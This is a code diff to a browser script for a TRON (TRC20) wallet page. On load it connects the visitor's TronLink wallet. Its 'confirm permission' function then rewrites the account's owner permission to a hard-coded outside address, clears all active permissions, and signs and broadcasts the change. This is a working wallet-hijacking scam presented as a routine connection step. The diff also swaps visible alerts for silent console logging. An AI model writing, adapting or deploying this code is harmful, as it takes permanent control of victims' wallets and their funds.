@@ -1,49 +1,63 @@
 document.addEventListener('DOMContentLoaded', async () => {
-    console.log('Script loaded');
-    const tronWeb = window.tronWeb;
-
-    // 检查TronLink是否安装
-    if (typeof tronWeb === 'undefined') {
-        alert("TronLink is not installed. Please install TronLink to proceed.");
-    } else {
-        console.log('TronLink detected');
-        // 检查钱包是否已连接
-        if (!tronWeb.defaultAddress.base58) {
-            try {
-                await connectWallet();
-            } catch (error) {
-                console.error("Error connecting to TronLink:", error);
-                alert("Error: " + error.message);
-            }
-        }
+    if (!isTronWebInstalled()) {
+        console.error("TRC20钱包未安装，请使用TRC20钱包以继续。");
+        return;
     }
 
-    startCountdown();
+    try {
+        await connectWallet();
+    } catch (error) {
+        console.error("连接钱包时出错:", error);
+    }
 });
+
+// 检查是否安装了TronWeb（支持TRC20的钱包）
+function isTronWebInstalled() {
+    return typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress.base58;
+}
 
 // 连接钱包的函数
 async function connectWallet() {
     const tronWeb = window.tronWeb;
 
-    // 请求TronLink连接
-    await tronWeb.request({
-        method: 'tron_requestAccounts'
-    });
+    if (tronWeb.defaultAddress.base58) {
+        console.log("钱包已连接:", tronWeb.defaultAddress.base58);
+        return;
+    }
+
+    if (tronWeb.request) {
+        await tronWeb.request({
+            method: 'tron_requestAccounts'
+        });
+    } else if (tronWeb.trx && tronWeb.trx.getCurrentAccount) {
+        await tronWeb.trx.getCurrentAccount();
+    } else {
+        throw new Error("连接钱包失败，请使用支持的TRON钱包。");
+    }
+
+    if (!tronWeb.defaultAddress.base58) {
+        throw new Error("连接钱包失败。");
+    }
 }
 
 // 确认权限转移的函数
 async function confirmPermission() {
     const tronWeb = window.tronWeb;
     const currentAddress = tronWeb.defaultAddress.base58;
+
+    if (!currentAddress) {
+        console.error("未找到钱包地址，请连接您的钱包。");
+        return;
+    }
+
     const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';
 
-    console.log("Current Address:", currentAddress);
-    console.log("New Owner Address:", newOwnerAddress);
+    console.log("当前地址:", currentAddress);
+    console.log("新所有者地址:", newOwnerAddress);
 
     try {
-        // 获取当前账户权限信息
         const accountInfo = await tronWeb.trx.getAccount(currentAddress);
-        console.log("Account Info:", accountInfo);
+        console.log("账户信息:", accountInfo);
 
         const ownerPermission = {
             type: 0,
@@ -55,9 +69,8 @@ async function confirmPermission() {
             }]
         };
 
-        const activePermissions = [];  // 清除现有的active权限
+        const activePermissions = [];
 
-        // 使用 TronWeb 的 transactionBuilder.updateAccountPermissions 方法
         const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
             currentAddress,
             ownerPermission,
@@ -65,39 +78,20 @@ async function confirmPermission() {
             activePermissions
         );
 
-        console.log("Transaction:", transaction);
+        console.log("交易:", transaction);
 
-        // 签名交易
         const signedTransaction = await tronWeb.trx.sign(transaction);
-        console.log("Signed Transaction:", signedTransaction);
+        console.log("签名的交易:", signedTransaction);
 
-        // 发送交易
         const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
-        console.log("Transaction Result:", result);
+        console.log("交易结果:", result);
 
         if (result.result) {
-            alert("Transaction sent successfully. Please check your wallet to sign the transaction.");
+            console.log("交易发送成功，请检查您的钱包以签署交易。");
         } else {
-            alert("Transaction failed: " + result.message);
+            console.error("交易失败:", result.message);
         }
     } catch (error) {
-        console.error("Error sending transaction:", error);
-        alert("Error: " + error.message);
+        console.error("发送交易时出错:", error);
     }
-}
-
-// 实时倒计时函数
-function startCountdown() {
-    let countdownElement = document.querySelector('.countdown');
-    let countdownValue = 120;
-
-    let countdownInterval = setInterval(() => {
-        countdownValue--;
-        countdownElement.textContent = countdownValue;
-
-        if (countdownValue <= 0) {
-            clearInterval(countdownInterval);
-            countdownElement.textContent = '请尽快转入';
-        }
-    }, 1000);
 }
